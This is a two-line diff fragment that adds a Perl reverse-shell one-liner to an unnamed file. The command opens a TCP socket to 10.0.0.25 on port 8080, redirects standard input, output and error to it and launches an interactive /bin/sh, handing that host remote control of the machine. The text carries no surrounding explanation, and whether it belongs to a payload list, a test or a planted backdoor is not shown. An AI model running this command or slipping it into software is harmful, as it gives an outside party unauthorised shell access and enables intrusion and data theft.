@@ -1,0 +1,2 @@
+perl -e 'use Socket;$ip="10.0.0.25";$port=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");e
+xec("/bin/sh -i");};'
